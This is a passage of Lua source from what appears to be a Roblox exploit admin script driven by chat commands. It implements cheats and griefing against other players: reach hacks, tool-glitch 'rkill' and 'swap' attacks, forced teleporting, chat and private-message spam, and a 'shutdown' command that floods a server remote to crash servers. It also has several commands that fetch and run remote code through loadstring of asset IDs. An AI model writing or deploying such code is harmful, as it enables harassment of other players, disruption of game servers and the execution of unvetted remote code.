							BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
						else
							BV.velocity = Vector3.new(0, 0.1, 0)
						end
						BG.cframe = workspace.CurrentCamera.CoordinateFrame
					until not flying
					CONTROL = {F = 0, B = 0, L = 0, R = 0}
					lCONTROL = {F = 0, B = 0, L = 0, R = 0}
					SPEED = 0
					BG:destroy()
					BV:destroy()
					lplayer.Character.Humanoid.PlatformStand = false
				end)
			end
			Mouse.KeyDown:connect(function(KEY)
				if KEY:lower() == 'w' then
					CONTROL.F = speedfly
				elseif KEY:lower() == 's' then
					CONTROL.B = -speedfly
				elseif KEY:lower() == 'a' then
					CONTROL.L = -speedfly 
				elseif KEY:lower() == 'd' then 
					CONTROL.R = speedfly
				end
			end)
			Mouse.KeyUp:connect(function(KEY)
				if KEY:lower() == 'w' then
					CONTROL.F = 0
				elseif KEY:lower() == 's' then
					CONTROL.B = 0
				elseif KEY:lower() == 'a' then
					CONTROL.L = 0
				elseif KEY:lower() == 'd' then
					CONTROL.R = 0
				end
			end)
			fly()
		end
		if string.sub(msg, 1, 6) == (prefix.."unfly") then
			flying = false
			lplayer.Character.Humanoid.PlatformStand = false
		end
		if string.sub(msg, 1, 6) == (prefix.."chat ") then
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer((string.sub(msg, 7)), "All")
		end
		if string.sub(msg, 1, 6) == (prefix.."spam ") then
			spamtext = (string.sub(msg, 7))
			spamming = true
		end
		if string.sub(msg, 1, 7) == (prefix.."unspam") then
			spamming = false
		end
		if string.sub(msg, 1, 10) == (prefix.."spamwait ") then
			spamdelay = (string.sub(msg, 11))
		end
		if string.sub(msg, 1, 8) == (prefix.."pmspam ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
				pmspammed = v.Name
				spammingpm = true
			end
		end
		if string.sub(msg, 1, 9) == (prefix.."unpmspam") then
			spammingpm = false
		end
		if string.sub(msg, 1, 9) == (prefix.."cfreeze ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 10))) do
				v.Character["Left Leg"].Anchored = true
				v.Character["Left Arm"].Anchored = true
				v.Character["Right Leg"].Anchored = true
				v.Character["Right Arm"].Anchored = true
				v.Character.Torso.Anchored = true
				v.Character.Head.Anchored = true
			end
		end
		if string.sub(msg, 1, 11) == (prefix.."uncfreeze ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 12))) do
				v.Character["Left Leg"].Anchored = false
				v.Character["Left Arm"].Anchored = false
				v.Character["Right Leg"].Anchored = false
				v.Character["Right Arm"].Anchored = false
				v.Character.Torso.Anchored = false
				v.Character.Head.Anchored = false
			end
		end
		if string.sub(msg, 1, 9) == (prefix.."unlockws") then
			local a = game:GetService("Workspace"):getChildren()
			for i = 1, #a do
				if a[i].className == "Part" then
					a[i].Locked = false
				elseif a[i].className == "Model" then
					local r = a[i]:getChildren()
					for i = 1, #r do
						if r[i].className == "Part" then
							r[i].Locked = false
						end
					end
				end
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Success!";
				Text = "Workspace unlocked. Use ;lockws to lock.";
			})
		end
		if string.sub(msg, 1, 7) == (prefix.."lockws") then
			local a = game:GetService("Workspace"):getChildren()
			for i = 1, #a do
				if a[i].className == "Part" then
					a[i].Locked = true
				elseif a[i].className == "Model" then
					local r = a[i]:getChildren()
					for i = 1, #r do
						if r[i].className == "Part" then
							r[i].Locked = true
						end
					end
				end
			end
		end
		if string.sub(msg, 1, 7) == (prefix.."btools") then
			local Clone_T = Instance.new("HopperBin",lplayer.Backpack)
			Clone_T.BinType = "Clone"
			local Destruct = Instance.new("HopperBin",lplayer.Backpack)
			Destruct.BinType = "Hammer"
			local Hold_T = Instance.new("HopperBin",lplayer.Backpack)
			Hold_T.BinType = "Grab"
		end
		if string.sub(msg, 1, 7) == (prefix.."pstand") then
			lplayer.Character.Humanoid.PlatformStand = true
		end
		if string.sub(msg, 1, 9) == (prefix.."unpstand") then
			lplayer.Character.Humanoid.PlatformStand = false
		end
		if string.sub(msg, 1, 10) == (prefix.."blockhead") then
			lplayer.Character.Head.Mesh:Destroy()
		end
		if string.sub(msg, 1, 4) == (prefix.."sit") then
			lplayer.Character.Humanoid.Sit = true
		end
		if string.sub(msg, 1, 10) == (prefix.."bringobj ") then
			local function bringobjw()
				for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
					if obj.Name == (string.sub(msg, 11)) then
						obj.CFrame = lplayer.Character.HumanoidRootPart.CFrame
						obj.CanCollide = false
						obj.Transparency = 0.7
						wait()
						obj.CFrame = lplayer.Character["Left Leg"].CFrame
						wait()
						obj.CFrame = lplayer.Character["Right Leg"].CFrame
						wait()
						obj.CFrame = lplayer.Character["Head"].CFrame
					end
				end
			end
			while wait() do
				bringobjw()
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "BringObj";
				Text = "BringObj enabled.";
			})
		end
		if string.sub(msg, 1, 7) == (prefix.."wsvis ") then
			vis = (string.sub(msg, 8))
			local a = game:GetService("Workspace"):GetDescendants()
			for i = 1, #a do
				if a[i].className == "Part" then
					a[i].Transparency = vis
				elseif a[i].className == "Model" then
					local r = a[i]:getChildren()
					for i = 1, #r do
						if r[i].className == "Part" then
							r[i].Transparency = vis
						end
					end
				end
			end
		end
		if string.sub(msg, 1, 11) == (prefix.."hypertotal") then
			loadstring(game:GetObjects("rbxassetid://1255063809")[1].Source)()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Success!";
				Text = "HyperTotal GUI Loaded!";
			})
		end
		if string.sub(msg, 1, 5) == (prefix.."cmds") then
			CMDSFRAME.Visible = true
		end
		if string.sub(msg, 1, 10) == (prefix.."rmeshhats") then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Accessory")) or (v:IsA("Hat")) then
					v.Handle.Mesh:Destroy()
				end
			end
		end
		if string.sub(msg, 1, 10) == (prefix.."blockhats") then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Accessory")) or (v:IsA("Hat")) then
					v.Handle.Mesh:Destroy()
				end
			end
		end
		if string.sub(msg, 1, 10) == (prefix.."rmeshtool") then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Tool")) then
					v.Handle.Mesh:Destroy()
				end
			end
		end
		if string.sub(msg, 1, 10) == (prefix.."blocktool") then
			for i,v in pairs(lplayer.Character:GetChildren()) do
				if (v:IsA("Tool")) then
					v.Handle.Mesh:Destroy()
				end
			end
		end
		if string.sub(msg, 1, 8) == (prefix.."spinner") then
			local p = Instance.new("RocketPropulsion")
			p.Parent = lplayer.Character.HumanoidRootPart
			p.Name = "Spinner"
			p.Target = lplayer.Character["Left Arm"]
			p:Fire()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Spinner enabled";
				Text = "Type ;nospinner to disable.";
			})
		end
		if string.sub(msg, 1, 10) == (prefix.."nospinner") then
			lplayer.Character.HumanoidRootPart.Spinner:Destroy()
		end
		if string.sub(msg, 1, 7) == (prefix.."reachd") then
			for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
				if v:isA("Tool") then
					local a = Instance.new("SelectionBox",v.Handle)
					a.Adornee = v.Handle
					v.Handle.Size = Vector3.new(0.5,0.5,60)
					v.GripPos = Vector3.new(0,0,0)
					lplayer.Character.Humanoid:UnequipTools()
				end
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Reach applied!";
				Text = "Applied to equipped sword. Use ;noreach to disable.";
			})
		end
		if string.sub(msg, 1, 7) == (prefix.."reach ") then
			for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
				if v:isA("Tool") then
					handleSize = v.Handle.Size
					wait()
					local a = Instance.new("SelectionBox",v.Handle)
					a.Name = "a"
					a.Adornee = v.Handle
					v.Handle.Size = Vector3.new(0.5,0.5,(string.sub(msg, 8)))
					v.GripPos = Vector3.new(0,0,0)
					lplayer.Character.Humanoid:UnequipTools()
				end
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Reach applied!";
				Text = "Applied to equipped sword. Use ;noreach to disable.";
			})
		end
		if string.sub(msg, 1, 8) == (prefix.."noreach") then
			for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
				if v:isA("Tool") then
					v.Handle.a:Destroy()
					v.Handle.Size = handleSize
				end
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Reach removed!";
				Text = "Removed reach from equipped sword.";
			})
		end
		if string.sub(msg, 1, 7) == (prefix.."rkill ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 8)))do
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
					lplayer.Character.Humanoid:EquipTool(v)
				end
				wait(0.1)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.2)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.5)
				lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Tools needed!";
					Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(msg, 1, 7) == (prefix.."tp me ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
			end
		end
		if string.sub(msg, 1, 8) == (prefix.."cbring ") then
			if (string.sub(msg, 9)) == "all" or (string.sub(msg, 9)) == "All" or (string.sub(msg, 9)) == "ALL" then
				cbringall = true
			else
				for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
					brplr = v.Name
				end
			end
			cbring = true
		end
		if string.sub(msg, 1, 9) == (prefix.."uncbring") then
			cbring = false
			cbringall = false
		end
		if string.sub(msg, 1, 6) == (prefix.."swap ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
				local NOWPLR = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				local NOW = lplayer.Character.HumanoidRootPart.CFrame
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
					lplayer.Character.Humanoid:EquipTool(v)
				end
				local function tp(player,player2)
					local char1,char2=player.Character,player2.Character
					if char1 and char2 then
						char1:MoveTo(char2.Head.Position)
					end
				end
				wait(0.1)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.2)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
				wait(0.5)
				lplayer.Character.HumanoidRootPart.CFrame = NOW
				wait(0.6)
				tp(lplayer, game:GetService("Players")[v.Name])
				wait(0.4)
				lplayer.Character.HumanoidRootPart.CFrame = NOWPLR
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Tools needed!";
					Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(msg, 1, 8) == (prefix.."glitch ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
				lplayer.Character.Humanoid.Name = 1
				local l = lplayer.Character["1"]:Clone()
				l.Parent = lplayer.Character
				l.Name = "Humanoid"
				wait(0.1)
				lplayer.Character["1"]:Destroy()
				game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
				lplayer.Character.Animate.Disabled = true
				wait(0.1)
				lplayer.Character.Animate.Disabled = false
				lplayer.Character.Humanoid.DisplayDistanceType = "None"
				for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
					lplayer.Character.Humanoid:EquipTool(v)
				end
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
				wait(0.3)
				lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
				wait(0.4)
				b = Instance.new("BodyForce")
				b.Parent = lplayer.Character.HumanoidRootPart
				b.Name = "Glitch"
				b.Force = Vector3.new(100000000,5000,0)
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "Tools needed!";
					Text = "You need a tool in your backpack for this command!";
				})
			end
		end
		if string.sub(msg, 1, 9) == (prefix.."unglitch") then
			lplayer.Character.HumanoidRootPart.Glitch:Destroy()
			lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(10000,0,10000)
			b = Instance.new("BodyForce")
			b.Parent = lplayer.Character.HumanoidRootPart
			b.Name = "unGlitch"
			b.Force = Vector3.new(0,-5000000,0)
			wait(2)
			lplayer.Character.HumanoidRootPart.unGlitch:Destroy()
		end
		if string.sub(msg, 1, 9) == (prefix.."grespawn") then
			lplayer.Character.Humanoid.Health = 0
			wait(1)
			lplayer.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
			lplayer.Character.Torso.CFrame = CFrame.new(1000000,0,1000000)
		end
		if string.sub(msg, 1, 9) == (prefix.."explorer") then
			loadstring(game:GetObjects("rbxassetid://492005721")[1].Source)()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Success!";
				Text = "DEX Explorer has loaded.";
			})
		end
		if string.sub(msg, 1, 6) == (prefix.."anim ") then
			local Anim = Instance.new("Animation")
			Anim.AnimationId = "rbxassetid://"..(string.sub(msg, 7))
			local track = lplayer.Character.Humanoid:LoadAnimation(Anim)
			track:Play(.1, 1, 1)
		end
		if string.sub(msg, 1, 8) == (prefix.."animgui") then
			loadstring(game:GetObjects("rbxassetid://1202558084")[1].Source)()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Success!";
				Text = "Energize Animations GUI has loaded.";
			})
		end
		if string.sub(msg, 1, 8) == (prefix.."savepos") then
			saved = lplayer.Character.HumanoidRootPart.CFrame
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Position Saved";
				Text = "Use ;loadpos to return to saved position.";
			})
		end
		if string.sub(msg, 1, 8) == (prefix.."loadpos") then
			lplayer.Character.HumanoidRootPart.CFrame = saved
		end
		if string.sub(msg, 1, 6) == (prefix.."bang ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
				local Anim2 = Instance.new("Animation")
				Anim2.AnimationId = "rbxassetid://148840371"
				local track2 = lplayer.Character.Humanoid:LoadAnimation(Anim2)
				track2:Play(.1, 1, 1)
				bplrr = v.Name
				banpl = true
			end
		end
		if string.sub(msg, 1, 7) == (prefix.."unbang") then
			banpl = false
		end
		if string.sub(msg, 1, 10) == (prefix.."bringmod ") then
			local function bringmodw()
				for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
					if obj.Name == (string.sub(msg, 11)) then
						for i,ch in pairs(obj:GetDescendants()) do
							if (ch:IsA("BasePart")) then
								ch.CFrame = lplayer.Character.HumanoidRootPart.CFrame
								ch.CanCollide = false
								ch.Transparency = 0.7
								wait()
								ch.CFrame = lplayer.Character["Left Leg"].CFrame
								wait()
								ch.CFrame = lplayer.Character["Right Leg"].CFrame
								wait()
								ch.CFrame = lplayer.Character["Head"].CFrame
							end
						end
					end
				end
			end
			while wait() do
				bringmodw()
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "BringMod";
				Text = "BringMod enabled.";
			})
		end
		if string.sub(msg, 1, 8) == (prefix.."respawn") then
			local mod = Instance.new('Model', workspace) mod.Name = 're '..lplayer.Name
			local hum = Instance.new('Humanoid', mod)
			local ins = Instance.new('Part', mod) ins.Name = 'Torso' ins.CanCollide = false ins.Transparency = 1
			lplayer.Character = mod
		end
		if string.sub(msg, 1, 9) == (prefix.."shutdown") then
			game:GetService'RunService'.Stepped:Connect(function()
				pcall(function()
					for i,v in pairs(game:GetService'Players':GetPlayers()) do
						if v.Character ~= nil and v.Character:FindFirstChild'Head' then
							for _,x in pairs(v.Character.Head:GetChildren()) do
								if x:IsA'Sound' then x.Playing = true x.CharacterSoundEvent:FireServer(true, true) end
							end
						end
					end
				end)
			end)
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Attempting Shutdown";
				Text = "Shutdown Attempt has begun.";
			})
		end
		if string.sub(msg, 1, 8) == (prefix.."delobj ") then
			objtodel = (string.sub(msg, 9))
			for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
				if v.Name == objtodel then
					v:Destroy()
				end
			end
		end
		if string.sub(msg, 1, 8) == (prefix.."getplrs") then
			for i,v in pairs(game:GetService("Players"):GetPlayers())do
				print(v)
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Printed";
				Text = "Players have been printed to console. (F9)";
			})
		end
		if string.sub(msg, 1, 9) == (prefix.."deldecal") then
			for i,v in pairs(game:GetService("Workspace"):GetDescendants())do
				if (v:IsA("Decal")) then
					v:Destroy()
				end
			end
		end
		if string.sub(msg, 1, 11) == (prefix.."opfinality") then
			loadstring(game:GetObjects("rbxassetid://1294358929")[1].Source)()
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Success!";
				Text = "OpFinality GUI has loaded.";
			})
		end
		if string.sub(msg, 1, 8) == (prefix.."remotes") then
			remotes = true
			added = true
			game.DescendantAdded:connect(function(rmt)
				if added == true then
					if remotes == true then 
						if rmt:IsA("RemoteEvent") then
							print("A RemoteEvent was added!")
							print(" game." .. rmt:GetFullName() .. " | RemoteEvent")
							print(" game." .. rmt:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
						end end end
			end)
			game.DescendantAdded:connect(function(rmtfnctn)
				if added == true then
					if remotes == true then 
						if rmtfnctn:IsA("RemoteFunction") then
							warn("A RemoteFunction was added!")
							warn(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction")
							print(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
						end end end
			end)

			game.DescendantAdded:connect(function(bndfnctn)
				if added == true then
					if binds == true then 
						if bndfnctn:IsA("BindableFunction") then
							print("A BindableFunction was added!")
							print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction")
							print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
						end end end
			end)

			game.DescendantAdded:connect(function(bnd)
				if added == true then
					if binds == true then 
						if bnd:IsA("BindableEvent") then
							warn("A BindableEvent was added!")
							warn(" game." .. bnd:GetFullName() .. " | BindableEvent")
							print(" game." .. bnd:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
						end end end
			end)


			if binds == true then
				for i,v in pairs(game:GetDescendants()) do
					if v:IsA("BindableFunction") then
						print(" game." .. v:GetFullName() .. " | BindableFunction")
						print(" game." .. v:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
					end end
				for i,v in pairs(game:GetDescendants()) do
					if v:IsA("BindableEvent") then
						warn(" game." .. v:GetFullName() .. " | BindableEvent")
						print(" game." .. v:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
					end end
			else
				print("Off")
			end
			if remotes == true then
				for i,v in pairs(game:GetDescendants()) do
					if v:IsA("RemoteFunction") then
						warn(" game." .. v:GetFullName() .. " | RemoteFunction")
						print(" game." .. v:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
					end end
				wait()
				for i,v in pairs(game:GetDescendants()) do
					if v:IsA("RemoteEvent") then
						print(" game." .. v:GetFullName() .. " | RemoteEvent")
						print(" game." .. v:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
					end end
			else
				print("Off")
			end
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Printing Remotes";
				Text = "Type ;noremotes to disable.";
			})
		end
		if string.sub(msg, 1, 10) == (prefix.."noremotes") then
			remotes = false
			added = false
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Printing Remotes Disabled";
				Text = "Type ;remotes to enable.";
			})
		end
		if string.sub(msg, 1, 10) == (prefix.."tpdefault") then
			spin = false
			followed = false
			traill = false
			noclip = false
			annoying = false
			hwalk = false
			cbringing = false
		end
		if string.sub(msg, 1, 8) == (prefix.."stopsit") then
			stopsitting = true
		end
		if string.sub(msg, 1, 6) == (prefix.."gosit") then
			stopsitting = false
		end
		if string.sub(msg, 1, 8) == (prefix.."version") then
			print(adminversion)
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Version";
				Text = adminversion;
			})
		end
		if string.sub(msg, 1, 8) == (prefix.."clicktp") then
			clickgoto = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Click TP";
				Text = "Press E to teleport to mouse position, ;noclicktp to stop";
			})
		end
		if string.sub(msg, 1, 9) == (prefix.."clickdel") then
			clickdel = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Click Delete";
				Text = "Press E to delete part at mouse, ;noclickdel to stop";
			})
		end
		if string.sub(msg, 1, 11) == (prefix.."noclickdel") then
			clickdel = false
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Click Delete";
				Text = "Click delete has been disabled.";
			})
		end
		if string.sub(msg, 1, 10) == (prefix.."noclicktp") then
			clickgoto = false
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Click TP";
				Text = "Click TP has been disabled.";
			})
		end
		if string.sub(msg, 1, 8) == (prefix.."toolson") then
			gettingtools = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Tools Enabled";
				Text = "Automatically colleting tools dropped.";
			})
		end
		if string.sub(msg, 1, 9) == (prefix.."toolsoff") then
			gettingtools = false
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Tools Disabled";
				Text = "Click TP has been disabled.";
			})
		end
		if string.sub(msg, 1, 10) == (prefix.."delcmdbar") then
			ScreenGui:Destroy()
		end
		if string.sub(msg, 1, 6) == (prefix.."reset") then
			lplayer.Character.Head:Destroy()
		end
		if string.sub(msg, 1, 7) == (prefix.."state ") then
			statechosen = string.sub(msg, 8)
			changingstate = true
		end
		if string.sub(msg, 1, 9) == (prefix.."gravity ") then
			game:GetService("Workspace").Gravity = string.sub(msg, 10)
		end
		if string.sub(msg, 1, 10) == (prefix.."looprhats") then
			removingmeshhats = true
		end
		if string.sub(msg, 1, 12) == (prefix.."unlooprhats") then
			removingmeshhats = false
		end
		if string.sub(msg, 1, 10) == (prefix.."looprtool") then
			removingmeshtool = true
		end
		if string.sub(msg, 1, 12) == (prefix.."unlooprtool") then
			removingmeshtool = false
		end
		if string.sub(msg, 1, 10) == (prefix.."givetool ") then
			for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
				if v:IsA("Tool") then
					for i,player in pairs(GetPlayer(string.sub(msg, 11))) do
						v.Parent = player.Character
					end
				end
			end
		end
		if string.sub(msg, 1, 14) == (prefix.."givealltools ") then
			for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetDescendants()) do
				if v:IsA("Tool") then
					v.Parent = lplayer.Character
					wait()
					for i,player in pairs(GetPlayer(string.sub(msg, 15))) do
						v.Parent = player.Character
					end
				end
			end
		end
		if string.sub(msg, 1, 5) == (prefix.."age ") then
			for i,player in pairs(GetPlayer(string.sub(msg, 6))) do
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account Age: "..player.AccountAge.." days!", "All")
			end
		end
		if string.sub(msg, 1, 4) == (prefix.."id ") then
			for i,player in pairs(GetPlayer(string.sub(msg, 5))) do
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account ID: "..player.UserId, "All")
			end
		end
		if string.sub(msg, 1, 6) == (prefix..".age ") then
			for i,player in pairs(GetPlayer(string.sub(msg, 7))) do
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = player.AccountAge.." Days";
					Text = "Account age of "..player.Name;
				})
			end
		end
		if string.sub(msg, 1, 5) == (prefix..".id ") then
			for i,player in pairs(GetPlayer(string.sub(msg, 6))) do
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = player.UserId.." ID";
					Text = "Account ID of "..player.Name;
				})
			end
		end
		if string.sub(msg, 1, 7) == (prefix.."gameid") then
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Game ID";
				Text = "Game ID: ".. game.GameId;
			})
		end
		if string.sub(msg, 1, 4) == (prefix.."pgs") then
			local pgscheck = game:GetService("Workspace"):PGSIsEnabled()
			if pgscheck == true then
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "PGSPhysicsSolverEnabled";
					Text = "PGS is Enabled!";
				})
			else
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "PGSPhysicsSolverEnabled";
					Text = "PGS is Disabled!";
				})
			end
		end
		if string.sub(msg, 1, 12) == (prefix.."removeinvis") then
			for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
				if v:IsA("Part") then
					if v.Transparency == 1 then
						if v.Name ~= "HumanoidRootPart" then
							v:Destroy()
						end
					end
				end
			end
		end
		if string.sub(msg, 1, 10) == (prefix.."removefog") then
			game:GetService("Lighting").FogStart = 0
			game:GetService("Lighting").FogEnd = 9999999999999
		end
		if string.sub(msg, 1, 8) == (prefix.."disable") then
			lplayer.Character.Humanoid.Parent = lplayer
		end
		if string.sub(msg, 1, 7) == (prefix.."enable") then
			lplayer.Humanoid.Parent = lplayer.Character
		end
		if string.sub(msg, 1, 8) == (prefix.."prefix ") then
			prefix = (string.sub(msg, 9, 9))
			wait(0.1)
			change()
			wait(0.1)
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Prefix changed!";
				Text = "Prefix is now "..prefix..". Use ;resetprefix to reset to ;";
			})
		end
		if string.sub(msg, 1, 12) == (";resetprefix") then
			prefix = ";"
			wait(0.1)
			change()
			wait(0.1)
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "Prefix changed!";
				Text = "Prefix is now "..prefix..". Make sure it's one key!";
			})
		end
		if string.sub(msg, 1, 10) == (prefix.."flyspeed ") then
			speedfly = string.sub(msg, 11)
			wait()
			change()
		end
		if string.sub(msg, 1, 8) == (prefix.."carpet ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
				local Anim3 = Instance.new("Animation")
				Anim3.AnimationId = "rbxassetid://282574440"
				local track3 = lplayer.Character.Humanoid:LoadAnimation(Anim3)
				track3:Play(.1, 1, 1)
				bplrr = v.Name
				banpl = true
			end
		end
		if string.sub(msg, 1, 9) == (prefix.."uncarpet") then
			banpl = false
		end
		if string.sub(msg, 1, 7) == (prefix.."stare ") then
			for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
				staring = true
				stareplr = v
			end
		end
		if string.sub(msg, 1, 8) == (prefix.."unstare") then
			staring = false
		end
		if string.sub(msg, 1, 8) == (prefix.."logchat") then
			chatlogs = true
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "LogChat enabled";
				Text = "Now logging all player chat.";
			})
		end
		if string.sub(msg, 1, 10) == (prefix.."unlogchat") then
			chatlogs = false
			game:GetService("StarterGui"):SetCore("SendNotification", {
				Title = "LogChat disabled";
				Text = "Stopped logging all player chat.";
			})
		end
		if string.sub(msg, 1, 7) == (prefix.."fixcam") then
			game:GetService("Workspace").CurrentCamera:Destroy()
			wait(0.1)
			game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
			game:GetService("Workspace").CurrentCamera.CameraType = "Custom"
			lplayer.CameraMinZoomDistance = 0.5
			lplayer.CameraMaxZoomDistance = 400
			lplayer.CameraMode = "Classic"
		end
		if string.sub(msg, 1, 8) == (prefix.."unstate") then
			changingstate = false
		end
	end)

	local function tp()
		for i, player in ipairs(game:GetService("Players"):GetPlayers()) do
			if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
				if player.Name == brplr then
					player.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame + lplayer.Character.HumanoidRootPart.CFrame.lookVector * 2
				end
			end
		end
	end
	local function tpall()
		for i, player in ipairs(game:GetService("Players"):GetPlayers()) do
			if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
				player.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame + lplayer.Character.HumanoidRootPart.CFrame.lookVector * 3
			end
		end
	end
	spawn(function()
		while wait(spamdelay) do
			if spamming == true then
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spamtext, "All")
			end
		end
	end)
	spawn(function()
		while wait(spamdelay) do
			if spammingpm == true then
